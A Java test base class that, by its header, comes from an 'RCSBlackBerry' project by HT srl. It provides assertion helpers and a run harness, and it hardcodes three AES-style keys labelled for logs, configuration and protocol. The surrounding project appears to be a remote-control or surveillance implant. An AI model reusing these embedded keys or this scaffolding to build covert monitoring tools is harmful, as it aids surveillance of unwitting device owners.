//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests
 * File         : TestUnit.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests;

import blackberry.config.InstanceKeys;
import blackberry.config.Keys;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class TestUnit.
 */
public abstract class TestUnit {

    static protected Debug debug = new Debug("TestUnit", DebugLevel.VERBOSE);

    // RCS 323
    byte[] LogKey = new byte[] { (byte) 0x2b, (byte) 0xb8, (byte) 0x0b,
            (byte) 0xc9, (byte) 0x61, (byte) 0x0a, (byte) 0x0a, (byte) 0x7b,
            (byte) 0x6c, (byte) 0x9c, (byte) 0x10, (byte) 0x06, (byte) 0x85,
            (byte) 0x3d, (byte) 0x80, (byte) 0x72 };
    byte[] ConfKey = new byte[] { (byte) 0xdc, (byte) 0xaa, (byte) 0x14,
            (byte) 0xa8, (byte) 0xdd, (byte) 0xe6, (byte) 0x94, (byte) 0x69,
            (byte) 0x38, (byte) 0x25, (byte) 0x88, (byte) 0x45, (byte) 0x32,
            (byte) 0xb2, (byte) 0x4a, (byte) 0x1a };
    byte[] ProtoKey = new byte[] { (byte) 0xb0, (byte) 0xf4, (byte) 0x45,
            (byte) 0x16, (byte) 0xd1, (byte) 0x30, (byte) 0xd0, (byte) 0xa5,
            (byte) 0x51, (byte) 0x30, (byte) 0xdb, (byte) 0x9b, (byte) 0xac,
            (byte) 0x6f, (byte) 0xd5, (byte) 0xfb };

    Tests tests = null;
    public String name = "test";

    public String result = "none";
    public String error = "";
    public boolean executed = false;
    public boolean passed = false;

    /**
     * Instantiates a new test unit.
     * 
     * @param name_
     *            the name_
     * @param tests_
     *            the tests_
     */
    public TestUnit(final String name_, final Tests tests_) {

        tests = tests_;
        name = name_;

        //#ifdef TEST
        final Keys keys = Keys.getInstance();
       /* InstanceKeys instance = keys.getInstanceKeys();

        instance.setAesKey(LogKey);
        instance.setChallengeKey(ProtoKey);
        instance.setBuildID("RCS_0000000323");
        instance.setConfKey(ConfKey);*/
        //#endif

    }

    /**
     * Assert equals.
     * 
     * @param a
     *            the a
     * @param b
     *            the b
     * @param message
     *            the message
     * @throws AssertException
     *             the assert exception
     */
    protected final void AssertEquals(final int a, final int b,
            final String message) throws AssertException {
        AssertEquals(new Integer(a), new Integer(b), message);
    }

    /**
     * Assert equals.
     * 
     * @param a
     *            the a
     * @param b
     *            the b
     * @param message
     *            the message
     * @throws AssertException
     *             the assert exception
     */
    protected final void AssertEquals(final Object a, final Object b,
            final String message) throws AssertException {
        if (!a.equals(b)) {
            debug.trace(a.toString() + " != " + b.toString());

            result = "ASSERT: " + message;

            debug.fatal(result);

            throw new AssertException();
        }
    }

    /**
     * Assert not null.
     * 
     * @param obj
     *            the obj
     * @param message
     *            the message
     * @throws AssertException
     *             the assert exception
     */
    protected final void AssertNotNull(final Object obj, final String message)
            throws AssertException {
        if (obj == null) {
            result = "ASSERT null: " + message;

            debug.fatal(result);

            throw new AssertException();
        }
    }

    /**
     * Assert that.
     * 
     * @param expr
     *            the expr
     * @param message
     *            the message
     * @throws AssertException
     *             the assert exception
     */
    protected final void AssertThat(final boolean expr, final String message)
            throws AssertException {
        if (!expr) {
            result = "ASSERT: " + message;

            debug.fatal(result);

            throw new AssertException();
        }
    }

    /**
     * Execute.
     * 
     * @return true, if successful
     */
    public final boolean execute() {
        executed = true;
        passed = false;
        result = "";
        try {
            passed = run();
        } catch (final AssertException ex) {
            ex.printStackTrace();
            error = ex.toString();
        } catch (final Exception ex) {
            ex.printStackTrace();
            error = ex.toString();
        }
        return passed;
    }

    /**
     * Run.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    public abstract boolean run() throws AssertException;

}
